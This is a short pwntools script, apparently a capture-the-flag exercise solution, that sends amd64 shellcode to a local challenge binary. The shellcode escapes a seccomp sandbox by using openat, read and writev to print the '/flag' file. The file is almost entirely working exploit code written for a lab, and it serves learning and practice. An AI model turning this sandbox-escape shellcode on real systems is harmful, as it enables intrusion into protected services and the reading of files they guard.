from pwn import *

p = process("./chal3")
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# You can check all Linux x64 syscalls at this page: https://syscalls64.paolostivanin.com/
# For this challenge, your task is bypassing the sandbox and read the flag
# 1. there are some hints in this passage: https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html
# 2. if you don't know how to use a syscall, read the manual page of it. There are some samples on it.
# Btw, the name of our target is "/flag" 
context.arch = 'amd64'
gdb.attach(p)

path_of_flag = hex(u64(b"/flag".ljust(8,b'\0')))
shellcode = f'''
xor rax,rax
mov ax,0x101
xor rdi,rdi
mov rsi,{path_of_flag}
push rsi
mov rsi,rsp
mov rdx,0
syscall
mov rdi,rax
mov al,0
mov dl,0xff
syscall
xor rax,rax
mov di,0x1
mov al,0xff
push rax
push rsi
mov rsi,rsp
mov dl,0x1
mov al,0x14
syscall
'''
shellcode = asm(shellcode)
p.send(shellcode)
p.interactive()